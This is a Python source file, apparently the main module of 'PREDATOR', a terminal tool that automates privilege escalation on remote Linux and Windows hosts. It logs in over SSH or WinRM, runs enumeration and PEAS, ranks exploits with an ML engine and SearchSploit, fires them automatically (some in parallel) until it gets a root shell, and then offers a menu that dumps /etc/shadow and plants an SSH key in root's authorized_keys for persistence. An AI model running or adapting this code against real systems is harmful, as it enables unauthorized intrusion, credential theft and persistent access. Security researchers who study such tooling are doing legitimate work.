from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, TabbedContent, TabPane, Static, DataTable, Tree, Label, Button, Select, RichLog
from textual.containers import Container, Vertical, Horizontal
from textual import work
from rich.text import Text
from ui.screens import ConnectionScreen, EnumerationScreen, ExploitsScreen, ShellScreen, AutoExploitScreen
from ui.terminal_screen import TerminalScreen
from ui.ai_exploiter_screen import AIExploiterScreen
import pyfiglet
import os
import time
import importlib
import threading
from connector.ssh_connector import SSHConnector
from connector.winrm_connector import WinRMConnector
from enumerator.linux_enumerator import LinuxEnumerator
from enumerator.windows_enumerator import WindowsEnumerator
from enumerator.command_loader import CommandLoader
from enumerator.findings_formatter import generate_findings
from ml.predictor import ExploitPredictor
from ml.enhanced_predictor import EnhancedExploitPredictor
from ml.linpeas_parser import parse as parse_peas, extract_critical_findings
from ml.exploit_matcher import match as match_exploits
from exploits.exploit_executor import ExploitExecutor
from parallel_executor import execute_exploits_parallel
from peas_integrator import run_peas
from utils.logger import get_logger
import yaml
try:
    from brain.brain import PredatorBrain
    _BRAIN_AVAILABLE = True
except ImportError as _brain_err:
    _BRAIN_AVAILABLE = False
    PredatorBrain = None
logger = get_logger('PredatorTUI')

class PredatorApp(App):
    """The Predator TUI for automated privilege escalation."""
    CSS_PATH = 'ui/styles.tcss'
    TITLE = 'PREDATOR'
    SUB_TITLE = 'Automated Privilege Escalation Engine'
    BINDINGS = [('ctrl+q', 'quit', 'Quit'), ('tab', 'app.focus_next', 'Next Widget'), ('enter', 'run_selected_exploit', 'Run Exploit')]

    def __init__(self):
        super().__init__()
        self.session_connector = None
        self.os_type = None
        self.raw_findings = {}
        self.features = {}
        self.recommendations = []
        self.selected_exploit = None
        self.enum_pause_event = threading.Event()
        self.enum_pause_event.set()
        self.use_parallel_mode = True
        self.linpeas_output = None
        self.parsed_findings = {}
        self.config = {}
        try:
            with open('config.yaml') as _cfg_f:
                self.config = yaml.safe_load(_cfg_f) or {}
        except Exception:
            pass
        self._brain: PredatorBrain | None = None
        if _BRAIN_AVAILABLE:
            try:
                with open('config.yaml') as _f:
                    _cfg = yaml.safe_load(_f)
                self._brain = PredatorBrain(_cfg)
                logger.info('PredatorBrain initialised.')
            except Exception as _brain_init_err:
                logger.warning(f'Brain init failed: {_brain_init_err}')

    def compose(self) -> ComposeResult:
        """Create child widgets for the app."""
        yield Header(show_clock=True)
        with Container(id='main_container'):
            with TabbedContent(initial='tab-connection', id='main_tabs'):
                with TabPane('Connection', id='tab-connection'):
                    yield ConnectionScreen()
                with TabPane('Enumeration', id='tab-enumeration'):
                    yield EnumerationScreen()
                with TabPane('PEAS', id='tab-peas'):
                    with Vertical(id='findings_panel'):
                        with Horizontal(id='findings_header', classes='header_row'):
                            yield Static('LinPEAS / WinPEAS Output', classes='title')
                            yield Button('Run PEAS', id='start_peas_btn', variant='error')
                        self.findings_log = RichLog(id='findings_log', highlight=False, markup=True, auto_scroll=True)
                        yield self.findings_log
                with TabPane('Exploits', id='tab-exploits'):
                    yield ExploitsScreen()
                with TabPane('Auto Exploit', id='tab-auto-exploit'):
                    yield AutoExploitScreen()
                with TabPane('Terminal', id='tab-terminal'):
                    yield TerminalScreen()
                with TabPane('AI Exploiter', id='tab-ai-exploiter'):
                    yield AIExploiterScreen()
                with TabPane('Shell', id='tab-shell'):
                    yield ShellScreen()
        yield Footer()

    def on_mount(self) -> None:
        """Setup initial state."""
        table = self.query_one('#exploits_table', DataTable)
        table.add_columns('Exploit Name', 'Confidence', 'Type', 'Chance', 'Description')
        try:
            qw_table = self.query_one('#quick_wins_table', DataTable)
            qw_table.add_columns('Severity', 'Type', 'Context', 'Title')
        except Exception as e:
            logger.error(f'Failed to initialize Quick Wins table: {e}')

    def update_findings(self, text: str):
        """Update the Findings tab log."""
        self.findings_log.clear()
        self.findings_log.write(Text.from_ansi(text))

    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle all button presses in the application."""
        button_id = event.button.id
        if button_id == 'connect_btn':
            self.handle_connection()
        elif button_id == 'run_exploit_btn':
            self.handle_run_exploit()
        elif button_id == 'refresh_searchsploit_btn':
            self.handle_refresh_searchsploit()
        elif button_id == 'start_auto_exploit_btn':
            self.handle_auto_exploit()
        elif button_id == 'stop_auto_exploit_btn':
            self.handle_stop_auto_exploit()
        elif button_id == 'start_peas_btn':
            self.handle_run_peas()
        elif button_id == 'pause_resume_btn':
            if self.enum_pause_event.is_set():
                self.enum_pause_event.clear()
                event.button.label = 'Resume'
                event.button.variant = 'success'
                self.query_one('#enum_log', RichLog).write('[bold yellow]User requested pause...[/bold yellow]\n')
            else:
                self.enum_pause_event.set()
                event.button.label = 'Pause'
                event.button.variant = 'warning'
                self.query_one('#enum_log', RichLog).write('[bold green]User requested resume...[/bold green]\n')

    def handle_connection(self):
        """Process connection form and start background worker."""
        target_ip = self.query_one('#target_ip').value
        username = self.query_one('#username').value
        password = self.query_one('#password').value
        os_select = self.query_one('#os').value
        status = self.query_one('#conn_status', Static)
        if not target_ip or not username or (not isinstance(os_select, str)):
            status.update('[bold red]Please fill required fields (IP, Username, OS)[/bold red]')
            return
        self.os_type = os_select
        status.update('[bold yellow]Connecting... Switch to Enumeration tab for progress.[/bold yellow]')
        self.query_one('#main_tabs').active = 'tab-enumeration'
        enum_log = self.query_one('#enum_log', RichLog)
        enum_log.clear()
        self.enum_pause_event.set()
        try:
            btn = self.query_one('#pause_resume_btn', Button)
            btn.disabled = False
            btn.label = 'Pause'
            btn.variant = 'warning'
        except Exception as e:
            logger.error(f'Failed to enable pause button: {e}')
        try:
            peas_btn = self.query_one('#start_peas_btn', Button)
            peas_btn.label = f"Run {('LinPEAS' if self.os_type == 'linux' else 'WinPEAS')}"
        except Exception:
            pass
        self.run_connection_and_enumeration(target_ip, username, password, self.os_type)

    @work(exclusive=True, thread=True)
    def run_connection_and_enumeration(self, target, username, password, os_type):
        """Background thread for connecting and running enumeration."""

        def log_cb(msg):
            self.call_from_thread(self.query_one('#enum_log', RichLog).write, msg)

        def disable_pause_btn():
            try:
                btn = self.query_one('#pause_resume_btn', Button)
                btn.disabled = True
                btn.label = 'Pause'
                btn.variant = 'warning'
            except Exception:
                pass
        log_cb(f'[bold magenta][*] Initializing {os_type.upper()} connection to {target}...[/bold magenta]\n')
        if os_type == 'linux':
            self.session_connector = SSHConnector(target, username, password)
        else:
            self.session_connector = WinRMConnector(target, username, password)
        if not self.session_connector.connect():
            log_cb('[bold red][!] Connection failed. Check credentials and target.[/bold red]\n')
            self.call_from_thread(disable_pause_btn)
            return
        log_cb('[bold green][+] Connected successfully![/bold green]\n\n')
        log_cb('[bold magenta][*] Starting Enumeration...[/bold magenta]\n')
        dataset_path = 'enumerator/enumeration_commands.json'
        loader = CommandLoader(dataset_path)
        if os_type == 'linux':
            enumerator = LinuxEnumerator(self.session_connector, loader)
        else:
            enumerator = WindowsEnumerator(self.session_connector, loader)

        def live_findings_cb(findings):
            pass
        self.raw_findings = enumerator.run_all(update_callback=log_cb, pause_event=self.enum_pause_event, findings_callback=live_findings_cb)
        structured_findings = enumerator.get_structured_findings()
        self.features = enumerator.get_features()
        log_cb('[bold green][+] Enumeration Complete.[/bold green]\n')
        log_cb('[bold magenta][*] Sending findings to ML recommendation engine...[/bold magenta]\n')
        predictor = EnhancedExploitPredictor(self.os_type)
        self.recommendations = predictor.predict(enumerator.commands, enumerator.raw_results, linpeas_output=None)
        log_cb(f'[bold green][+] Generated {len(self.recommendations)} recommendations.[/bold green]\n')
        self.call_from_thread(self.populate_exploits_table)
        log_cb('[bold green][+] Recommendations generated. Switch to Exploits tab.[/bold green]\n')
        log_cb('[cyan][*] TIP: Run PEAS for more accurate recommendations![/cyan]\n')
        self.call_from_thread(disable_pause_btn)

    def populate_quick_wins_table(self, critical_findings):
        """Update the Quick Wins Data table with critical findings."""
        try:
            table = self.query_one('#quick_wins_table', DataTable)
            table.clear()
            for idx, finding in enumerate(critical_findings):
                severity = finding['severity']
                if severity == 'Critical':
                    sev_str = f'[bold red on white]{severity}[/bold red on white]'
                else:
                    sev_str = f'[bold red]{severity}[/bold red]'
                row = (sev_str, f"[cyan]{finding['type']}[/cyan]", f"[italic]{finding['context']}[/italic]", finding['title'])
                table.add_row(*row, key=f'qw_{idx}')
        except Exception as e:
            logger.error(f'Error populating quick wins: {e}')

    def handle_run_peas(self):
        """Trigger the PEAS script manually from the UI."""
        if not self.session_connector or not getattr(self.session_connector, 'connected', False):
            self.update_findings('[bold red][!] Error: No active session to run PEAS. Connect first.[/bold red]\n')
            return
        btn = self.query_one('#start_peas_btn', Button)
        btn.disabled = True
        btn.label = 'Running PEAS...'
        self.findings_log.clear()
        self.findings_log.write('[bold magenta][*] Starting OS-Aware PEAS Execution...[/bold magenta]\n')
        self.findings_log.write('[bold yellow][*] This may take a few minutes. Please wait...[/bold yellow]\n')
        self.run_peas_worker()

    @work(exclusive=True, thread=True)
    def run_peas_worker(self):
        """Background thread to run the PEAS integration."""
        try:
            peas_output = run_peas(self.session_connector, self.os_type)
            self.linpeas_output = peas_output
            self.call_from_thread(self.update_findings, peas_output)
            self.call_from_thread(self.findings_log.write, '\n[bold green][+] PEAS execution completed successfully.[/bold green]\n')
            self.call_from_thread(self.findings_log.write, '[bold magenta][*] Analyzing findings for automated exploits...[/bold magenta]\n')
            try:
                findings = parse_peas(peas_output)
                critical_findings = extract_critical_findings(peas_output)
                self.call_from_thread(self.populate_quick_wins_table, critical_findings)
                from ml.enhanced_predictor import EnhancedExploitPredictor
                predictor = EnhancedExploitPredictor(self.os_type)
                if hasattr(self, 'raw_findings') and self.raw_findings:
                    from enumerator.command_loader import CommandLoader
                    loader = CommandLoader('enumerator/enumeration_commands.json')
                    commands = loader.load_commands(self.os_type)
                    self.recommendations = predictor.predict(commands, self.raw_findings, linpeas_output=peas_output)
                else:
                    self.recommendations = match_exploits(findings, self.os_type)
                self.call_from_thread(self.findings_log.write, f'[bold green][+] Generated {len(self.recommendations)} enhanced recommendations![/bold green]\n')
                self.call_from_thread(self.populate_exploits_table)
                self.call_from_thread(lambda: setattr(self.query_one('#main_tabs'), 'active', 'tab-exploits'))
            except Exception as ml_err:
                logger.error(f'Error during ML parsing: {ml_err}')
                self.call_from_thread(self.findings_log.write, f'[bold red][-] Exploit matching failed: {ml_err}[/bold red]\n')
        except Exception as e:
            self.call_from_thread(self.findings_log.write, f'\n[bold red][-] PEAS execution failed: {e}[/bold red]\n')
        finally:

            def reset_btn():
                try:
                    btn = self.query_one('#start_peas_btn', Button)
                    btn.disabled = False
                    btn.label = f"Run {('LinPEAS' if self.os_type == 'linux' else 'WinPEAS')}"
                except Exception:
                    pass
            self.call_from_thread(reset_btn)

    def populate_exploits_table(self):
        """Update the Data table with exploit recommendations."""
        table = self.query_one('#exploits_table', DataTable)
        table.clear()
        try:
            from exploits.exploit_executor import ExploitExecutor
            import yaml as _yaml
            with open('config.yaml', 'r') as _f:
                _cfg = _yaml.safe_load(_f)
            _executor = ExploitExecutor(self.session_connector, _cfg) if self.session_connector else None
        except Exception:
            _executor = None
        for idx, rec in enumerate(self.recommendations):
            conf = float(rec.get('confidence', 0))
            if conf > 0.7:
                conf_str = f'[bold green]{conf:.2f}[/bold green]'
            elif conf > 0.4:
                conf_str = f'[bold yellow]{conf:.2f}[/bold yellow]'
            else:
                conf_str = f'[bold red]{conf:.2f}[/bold red]'
            rec_type = rec.get('type', 'static')
            if rec_type == 'manual':
                type_str = '[bold magenta]📋 Manual[/bold magenta]'
            elif rec_type == 'searchsploit':
                type_str = '[cyan]🔍 SS[/cyan]'
            elif rec_type == 'metasploit':
                type_str = '[blue]💻 MSF[/blue]'
            else:
                type_str = '[yellow]⚡ ML[/yellow]'
            if _executor:
                try:
                    chance = _executor.dry_run_validate(rec)
                    chance_str = f'[dim]{chance:.0%}[/dim]'
                except Exception:
                    chance_str = '[dim]?[/dim]'
            else:
                chance_str = '[dim]—[/dim]'
            name_str = f"[bold red]{rec['name']}[/bold red]"
            table.add_row(name_str, conf_str, type_str, chance_str, rec.get('description', '')[:60], key=str(idx))

    def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        """Handle selection in data tables."""
        logger.info(f'Row selected in table: {event.data_table.id}, row_key: {event.row_key.value}')
        if event.data_table.id == 'exploits_table':
            idx = int(event.row_key.value)
            self.selected_exploit = self.recommendations[idx]
            logger.info(f'Selected exploit: {self.selected_exploit}')
        elif event.data_table.id == 'quick_wins_table':
            self.query_one('#main_tabs', TabbedContent).active = 'tab-exploits'

    def handle_run_exploit(self, exploit_info: dict=None):
        """Run the selected exploit (or a specific one passed directly)."""
        logger.info(f'handle_run_exploit called. selected_exploit={self.selected_exploit}')
        if exploit_info:
            self.selected_exploit = exploit_info
        else:
            table = self.query_one('#exploits_table', DataTable)
            try:
                crow = table.cursor_row
                if crow is not None and 0 <= crow < len(self.recommendations):
                    self.selected_exploit = self.recommendations[crow]
                    logger.info(f"Cursor row {crow} → {self.selected_exploit['name']}")
            except Exception as e:
                logger.error(f'Error reading cursor: {e}')
        if not self.selected_exploit:
            logger.warning('No exploit selected')
            self.notify('Select an exploit in the table first (click a row), then press Run.', title='No Selection', severity='warning')
            return
        if not self.session_connector or not self.session_connector.connected:
            logger.warning('No active session')
            self.notify('No active session connected!', title='Error', severity='error')
            return
        try:
            run_btn = self.query_one('#run_exploit_btn', Button)
            run_btn.disabled = True
            run_btn.label = '⏳ Running…'
        except Exception:
            pass
        logger.info('Switching to shell tab')
        self.query_one('#main_tabs', TabbedContent).active = 'tab-shell'
        shell_log = self.query_one('#shell_log', RichLog)
        shell_log.clear()
        shell_log.write(f"[bold red]>>> Arming: {self.selected_exploit['name']} <<<[/bold red]\n")
        logger.info('Running exploit worker')
        self.run_exploit_worker(self.selected_exploit)

    def switch_tab(self, tab_id: str):
        """Helper to switch to a named tab (can be called from exploit modules)."""
        try:
            self.query_one('#main_tabs', TabbedContent).active = tab_id
        except Exception as e:
            logger.error(f'switch_tab({tab_id}) failed: {e}')

    def handle_refresh_searchsploit(self):
        """Fetch and merge filtered SearchSploit local privesc results into recommendations."""
        if not self.os_type:
            self.notify('Connect to a target first!', severity='warning')
            return
        self.run_searchsploit_refresh_worker()

    @work(exclusive=False, thread=True)
    def run_searchsploit_refresh_worker(self):
        """Background thread to query SearchSploit for local privesc exploits."""

        def log_cb(msg):
            try:
                self.call_from_thread(self.query_one('#enum_log', RichLog).write, msg)
            except Exception:
                pass
        try:
            from exploits.searchsploit_filter import get_local_privesc_exploits
            log_cb('[bold cyan][*] Querying SearchSploit for local privesc exploits...[/bold cyan]\n')
            ss_exploits = get_local_privesc_exploits(self.os_type)
            log_cb(f'[green][+] Found {len(ss_exploits)} filtered SearchSploit exploits.[/green]\n')
            existing_paths = {r.get('module') for r in self.recommendations}
            added = 0
            for ex in ss_exploits:
                if added >= 20:
                    break
                if ex.get('module') not in existing_paths:
                    self.recommendations.append(ex)
                    existing_paths.add(ex.get('module'))
                    added += 1
            log_cb(f'[green][+] Merged {added} new SearchSploit exploits into recommendations.[/green]\n')
            self.call_from_thread(self.populate_exploits_table)
            self.call_from_thread(lambda: setattr(self.query_one('#main_tabs', TabbedContent), 'active', 'tab-exploits'))
        except Exception as e:
            log_cb(f'[red][-] SearchSploit refresh failed: {e}[/red]\n')
            logger.error(f'SearchSploit refresh error: {e}', exc_info=True)

    @work(exclusive=True, thread=True)
    def run_exploit_worker(self, exploit_info):
        """Background thread to run the exploit."""

        def log_cb(msg):
            self.call_from_thread(self.query_one('#shell_log', RichLog).write, msg)

        def re_enable_btn():
            try:
                btn = self.query_one('#run_exploit_btn', Button)
                btn.disabled = False
                btn.label = '▶  Run Selected Exploit'
            except Exception:
                pass
        log_cb(f"[bold red]>>> Arming {exploit_info['name']} <<<[/bold red]\n")
        try:
            with open('config.yaml', 'r') as f:
                config = yaml.safe_load(f)
            executor = ExploitExecutor(self.session_connector, config)
            success = executor.execute(exploit_info, update_callback=log_cb)
            if success:
                log_cb('\n[bold green]>>> ROOT SHELL INCOMING — DROPPING INTO INTERACTIVE SHELL <<<[/bold green]\n')
                log_cb("[bold yellow](Type 'exit' to quit shell and return to PREDATOR TUI)[/bold yellow]\n\n")
                self._privileged_session = executor.session
                self.call_from_thread(self.suspend_and_shell)
            else:
                log_cb('\n[bold red][!] Exploit failed — escalation not achieved.[/bold red]\n')
                log_cb('[yellow]Try another exploit or run PEAS for manual vectors.[/yellow]\n')
                self.call_from_thread(lambda: self.notify(f"{exploit_info['name']} failed. Try another exploit.", severity='error'))
        except Exception as e:
            log_cb(f'\n[bold red][!] Exploit execution error: {e}[/bold red]\n')
            logger.error(f'Exploit worker error: {e}', exc_info=True)
        finally:
            self.call_from_thread(re_enable_btn)

    def run_exploit_by_name(self, name: str, log_cb=None) -> bool:
        """
        Look up and run an exploit module by slug name.
        Called by Terminal tab (!exploit <name>) and AI Exploiter (auto-execute).
        Returns True if exploit succeeded (root achieved), False otherwise.
        """
        import importlib
        if log_cb is None:
            log_cb = lambda m: None
        if not self.session_connector or not self.session_connector.connected:
            log_cb('[red]run_exploit_by_name: no active session.[/red]')
            return False
        for ns in ('exploits.linux', 'exploits.manual', 'exploits.windows'):
            try:
                mod = importlib.import_module(f'{ns}.{name}')
                log_cb(f'[cyan][*] Running {ns}.{name}…[/cyan]')
                return bool(mod.run(self.session_connector, update_callback=log_cb))
            except ImportError:
                continue
            except Exception as e:
                log_cb(f'[red][-] Module error: {e}[/red]')
                return False
        log_cb(f"[red][-] Exploit module '{name}' not found.[/red]")
        return False

    def suspend_and_shell(self):
        """Suspend Textual app and enter interactive root shell."""
        active_session = getattr(self, '_privileged_session', None) or self.session_connector
        with self.suspend():
            os.system('clear' if os.name == 'posix' else 'cls')
            try:
                uid_out, _, _ = active_session.run_command('id -u 2>/dev/null')
                who_out, _, _ = active_session.run_command('whoami 2>/dev/null')
                uid = uid_out.strip()
                who = who_out.strip()
                if uid == '0':
                    priv_banner = f'\x1b[92m[+] ROOT SHELL! uid=0 ({who}) \x1b[0m'
                else:
                    priv_banner = f'\x1b[93m[!] Non-root shell: uid={uid} user={who}\x1b[0m'
            except Exception:
                priv_banner = '\x1b[93m[!] Could not determine privilege level.\x1b[0m'
            print('\n\x1b[91m╔══════════════════════════════════════════════════╗\x1b[0m')
            print('\x1b[91m║       PREDATOR — INTERACTIVE ROOT SHELL          ║\x1b[0m')
            print('\x1b[91m╚══════════════════════════════════════════════════╝\x1b[0m')
            print(priv_banner)
            print("\x1b[90m[*] Type 'exit' to return to PREDATOR TUI.\x1b[0m\n")
            active_session.interactive_session()
            self._post_exploit_menu(active_session)
            print('\n\x1b[91m[+] Shell exited — returning to PREDATOR TUI...\x1b[0m')
            time.sleep(1)
        self._privileged_session = None

    def _post_exploit_menu(self, session):
        """Simple post-exploitation menu offered after the shell exits."""
        try:
            print('\n\x1b[93m╔══════════════════════════════════════════════════╗\x1b[0m')
            print('\x1b[93m║         POST-EXPLOITATION MENU                   ║\x1b[0m')
            print('\x1b[93m╚══════════════════════════════════════════════════╝\x1b[0m')
            print('  [1] Dump /etc/shadow')
            print('  [2] Add SSH key for persistence')
            print('  [3] List all local users')
            print('  [4] Return to TUI (default)')
            choice = input('\x1b[91mPREDATOR post-exploit> \x1b[0m').strip()
            if choice == '1':
                out, _, _ = session.run_command('cat /etc/shadow 2>/dev/null')
                print(out or '(empty or not readable)')
                input('[Press Enter to continue]')
            elif choice == '2':
                pk = input('Paste your SSH public key: ').strip()
                if pk:
                    cmds = ['mkdir -p /root/.ssh && chmod 700 /root/.ssh', f"echo '{pk}' >> /root/.ssh/authorized_keys", 'chmod 600 /root/.ssh/authorized_keys']
                    for c in cmds:
                        session.run_command(c)
                    print('\x1b[92m[+] SSH key added to /root/.ssh/authorized_keys\x1b[0m')
                    input('[Press Enter to continue]')
            elif choice == '3':
                out, _, _ = session.run_command('cat /etc/passwd | cut -d: -f1,3')
                print(out)
                input('[Press Enter to continue]')
        except (KeyboardInterrupt, EOFError):
            pass
        except Exception:
            pass

    def handle_auto_exploit(self):
        """Start the automated exploit sequence."""
        if not self.recommendations:
            if hasattr(self, 'notify'):
                self.notify('No exploits recommended. Run Enumeration first.', severity='warning')
            return
        if not self.session_connector or not self.session_connector.connected:
            if hasattr(self, 'notify'):
                self.notify('Error: No active session connected!', severity='error')
            return
        btn_start = self.query_one('#start_auto_exploit_btn', Button)
        btn_stop = self.query_one('#stop_auto_exploit_btn', Button)
        log_view = self.query_one('#auto_exploit_log', RichLog)
        btn_start.disabled = True
        btn_stop.disabled = False
        log_view.clear()
        self.auto_pwn_stop_event = threading.Event()
        log_view.write('[bold cyan][*] Initiating Auto Pwn Sequence...[/bold cyan]\n')
        self.run_auto_exploit_worker()

    def handle_stop_auto_exploit(self):
        """Cancel the automated exploit sequence."""
        if hasattr(self, 'auto_pwn_stop_event'):
            self.auto_pwn_stop_event.set()
            self.query_one('#auto_exploit_log', RichLog).write('[bold yellow][!] Cancellation requested. Stopping after current attempt...[/bold yellow]\n')

    @work(exclusive=True, thread=True)
    def run_auto_exploit_worker(self):
        """Background thread to iterate and attempt exploits with parallel execution."""

        def log_cb(msg):
            self.call_from_thread(self.query_one('#auto_exploit_log', RichLog).write, msg)

        def reset_ui():
            self.query_one('#start_auto_exploit_btn', Button).disabled = False
            self.query_one('#stop_auto_exploit_btn', Button).disabled = True
        try:
            with open('config.yaml', 'r') as f:
                config = yaml.safe_load(f)
            executor = ExploitExecutor(self.session_connector, config)

            def _exploit_priority(rec):
                mod = rec.get('module', '')
                etype = rec.get('type', '')
                if etype == 'static' and any((x in mod for x in ['sudo', 'suid', 'python', 'pwnkit', 'bash', 'docker'])):
                    return (0, -float(rec.get('confidence', 0)))
                if etype == 'static':
                    return (1, -float(rec.get('confidence', 0)))
                return (2, -float(rec.get('confidence', 0)))
            sorted_recs = sorted(self.recommendations, key=_exploit_priority)
            gcc_available = None
            log_cb(f'[bold cyan][*] Found {len(sorted_recs)} potential exploit paths.[/bold cyan]\n')
            _has_python = False
            _has_gcc = False
            try:
                py_out, _, py_code = self.session_connector.run_command('which python3 python 2>/dev/null | head -1')
                _has_python = py_code == 0 and bool(py_out.strip())
                _, _, gcc_code = self.session_connector.run_command('command -v gcc 2>/dev/null')
                _has_gcc = gcc_code == 0
            except Exception:
                pass
            log_cb(f"[cyan][*] Target capabilities: python={('yes' if _has_python else 'NO')}, gcc={('yes' if _has_gcc else 'NO')}[/cyan]\n")
            INSTANT_CHECKS = [('test -w /etc/passwd && echo WRITABLE', lambda o: 'WRITABLE' in o, {'name': 'Writable /etc/passwd', 'module': 'writable_passwd', 'type': 'manual', 'confidence': 0.99}), ('sudo -n true 2>/dev/null && echo NOPASSWD', lambda o: 'NOPASSWD' in o, {'name': 'Sudo NOPASSWD Abuse', 'module': 'sudo_abuse', 'type': 'manual', 'confidence': 0.99}), ("find /usr/bin /bin -name 'python*' -perm -4000 2>/dev/null | head -1", lambda o: bool(o.strip()), {'name': 'SUID Python Exploit', 'module': 'suid_python', 'type': 'static', 'confidence': 0.98})]
            for check_cmd, check_fn, fast_rec in INSTANT_CHECKS:
                try:
                    fast_out, _, _ = self.session_connector.run_command(check_cmd, timeout=5)
                    if check_fn(fast_out):
                        log_cb(f"[bold green][+] Instant-win detected: {fast_rec['name']}![/bold green]\n")
                        sorted_recs = [fast_rec] + [r for r in sorted_recs if r.get('module') != fast_rec['module']]
                        break
                except Exception:
                    pass
            gcc_available = _has_gcc
            use_parallel = self.use_parallel_mode and len(sorted_recs) >= 2
            if use_parallel:
                log_cb('[bold magenta][*] PARALLEL MODE ENABLED - Attempting multiple exploits simultaneously![/bold magenta]\n')
                log_cb('[cyan][*] This will significantly speed up exploitation...[/cyan]\n\n')
                try:
                    success, winning_exploit = execute_exploits_parallel(executor, sorted_recs, update_callback=log_cb, max_parallel=3)
                    if success:
                        log_cb(f"\n[bold green][+] PARALLEL EXPLOITATION SUCCESSFUL with {winning_exploit['name']}![/bold green]\n")
                        log_cb('[bold green][+] Dropping into Interactive Shell...[/bold green]\n')
                        self.call_from_thread(lambda: setattr(self.query_one('#main_tabs', TabbedContent), 'active', 'tab-shell'))
                        self.call_from_thread(self.suspend_and_shell)
                        self.call_from_thread(reset_ui)
                        return
                    else:
                        log_cb('\n[bold red][-] All parallel attempts failed. Falling back to sequential mode...[/bold red]\n\n')
                except Exception as parallel_err:
                    log_cb(f'\n[bold red][-] Parallel execution error: {parallel_err}[/bold red]\n')
                    log_cb('[yellow][!] Falling back to sequential execution...[/yellow]\n\n')
            else:
                log_cb('[cyan][*] SEQUENTIAL MODE - Attempting exploits one by one...[/cyan]\n\n')
            success_found = False
            for i, rec in enumerate(sorted_recs):
                if hasattr(self, 'auto_pwn_stop_event') and self.auto_pwn_stop_event.is_set():
                    log_cb('[bold yellow][-] Auto Pwn aborted by user.[/bold yellow]\n')
                    break
                log_cb(f"\n[bold cyan]>>> Attempt {i + 1}/{len(sorted_recs)}: {rec['name']} (Confidence: {rec['confidence']}) <<<[/bold cyan]\n")
                if 'reason' in rec:
                    log_cb(f"[dim cyan]    Reason: {rec['reason']}[/dim cyan]\n")
                mod = rec.get('module', '')
                etype = rec.get('type', '')
                _python_needed_mods = ('suid_python', 'sudo_baron_samedit', 'pkexec_pwnkit')
                if not _has_python and mod in _python_needed_mods:
                    log_cb(f"[bold yellow][!] Skipping {rec['name']} — no Python on target.[/bold yellow]\n")
                    continue
                is_c_exploit = etype == 'searchsploit' and (mod.endswith('.c') or any((x in mod for x in ['dirtycow', 'dirtypipe', 'overlayfs', 'pwnkit'])))
                if is_c_exploit and (not gcc_available):
                    log_cb(f"[bold yellow][!] Skipping {rec['name']} — gcc not on target.[/bold yellow]\n")
                    continue
                try:
                    t_start = time.time()
                    success = executor.execute(rec, update_callback=log_cb)
                    t_elapsed = time.time() - t_start
                    if self._brain:
                        self._brain.record_outcome(rec.get('module', rec.get('name', 'unknown')), self.features, success=success, duration=t_elapsed)
                    if success:
                        log_cb('\n[bold green][+] EXPLOIT SUCCESSFUL! Dropping into Interactive Shell...[/bold green]\n')
                        success_found = True
                        self.call_from_thread(lambda: setattr(self.query_one('#main_tabs', TabbedContent), 'active', 'tab-shell'))
                        self.call_from_thread(self.suspend_and_shell)
                        break
                    else:
                        log_cb(f"[bold red][-] {rec['name']} failed. Moving to next...[/bold red]\n")
                except Exception as ex:
                    t_elapsed = time.time() - t_start if 't_start' in dir() else 0
                    err_str = str(ex)
                    if self._brain:
                        try:
                            diag = self._brain.diagnose_failure(rec.get('module', ''), err_str)
                            log_cb(self._brain.debugger.format_for_ui(diag) + '\n')
                            if diag['auto_fixable']:
                                fixed_rec = self._brain.auto_fix(diag['category'], rec, self.session_connector)
                                if fixed_rec and fixed_rec is not rec:
                                    log_cb('[cyan][*] Auto-fix applied — retrying...[/cyan]\n')
                                    try:
                                        success = executor.execute(fixed_rec, update_callback=log_cb)
                                        if success:
                                            log_cb('[bold green][+] EXPLOIT SUCCESSFUL (after auto-fix)![/bold green]\n')
                                            success_found = True
                                            self.call_from_thread(lambda: setattr(self.query_one('#main_tabs', TabbedContent), 'active', 'tab-shell'))
                                            self.call_from_thread(self.suspend_and_shell)
                                            break
                                    except Exception:
                                        pass
                        except Exception:
                            pass
                        self._brain.record_outcome(rec.get('module', ''), self.features, success=False, duration=t_elapsed, error=err_str)
                    log_cb(f"[bold red][!] Error executing {rec['name']}: {ex}[/bold red]\n")
                    logger.error(f'Exploit execution error: {ex}', exc_info=True)
            if not success_found and (not (hasattr(self, 'auto_pwn_stop_event') and self.auto_pwn_stop_event.is_set())):
                log_cb('\n[bold red][!] Auto Pwn exhausted all recommendations.[/bold red]\n')
                log_cb('\n[bold yellow]╔══════════════════════════════════════════════════════╗[/bold yellow]\n')
                log_cb('[bold yellow]║   TROUBLESHOOTING - All Exploits Failed              ║[/bold yellow]\n')
                log_cb('[bold yellow]╚══════════════════════════════════════════════════════╝[/bold yellow]\n')
                log_cb('[yellow]Possible reasons:[/yellow]\n')
                log_cb('[yellow]  • Target is fully patched[/yellow]\n')
                log_cb('[yellow]  • Missing dependencies (gcc, python, etc.)[/yellow]\n')
                log_cb('[yellow]  • Firewall/AV blocking execution[/yellow]\n')
                log_cb('[yellow]  • Wrong target architecture[/yellow]\n')
                log_cb('[yellow]Recommendations:[/yellow]\n')
                log_cb('[yellow]  1. Review PEAS tab for manual exploitation vectors[/yellow]\n')
                log_cb('[yellow]  2. Run PEAS if not already done for deeper enumeration[/yellow]\n')
                log_cb('[yellow]  3. Check exploit logs above for specific errors[/yellow]\n')
                log_cb('[yellow]  4. Try manual exploitation from Exploits tab[/yellow]\n')
                log_cb("[yellow]  5. Use 'Refresh SearchSploit' to find additional local exploits[/yellow]\n\n")
                if hasattr(self, 'notify'):
                    self.call_from_thread(self.notify, 'Auto Exploitation Failed - Check Logs', severity='error')
        except Exception as e:
            log_cb(f'\n[bold red][!] Critical Worker Error: {e}[/bold red]\n')
            logger.error(f'Auto exploit worker error: {e}', exc_info=True)
        finally:
            self.call_from_thread(reset_ui)

    def action_run_selected_exploit(self):
        """Action invoked by Enter key — runs the highlighted exploit in exploits table."""
        try:
            active_tab = self.query_one('#main_tabs', TabbedContent).active
            if active_tab != 'tab-exploits':
                return
        except Exception:
            return
        self.handle_run_exploit()

def show_banner():
    """Display the Predator ASCII art banner."""
    f = pyfiglet.Figlet(font='slant')
    banner = f.renderText('PREDATOR')
    print(f'\x1b[91m{banner}\x1b[0m')
    print('\x1b[91m[+] Red Team Operations Ready [+]\x1b[0m')
    from rich import print as rprint
    rprint('[bold red]Created by AgamSandhu-cysec[/bold red]\n')
    time.sleep(1)

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
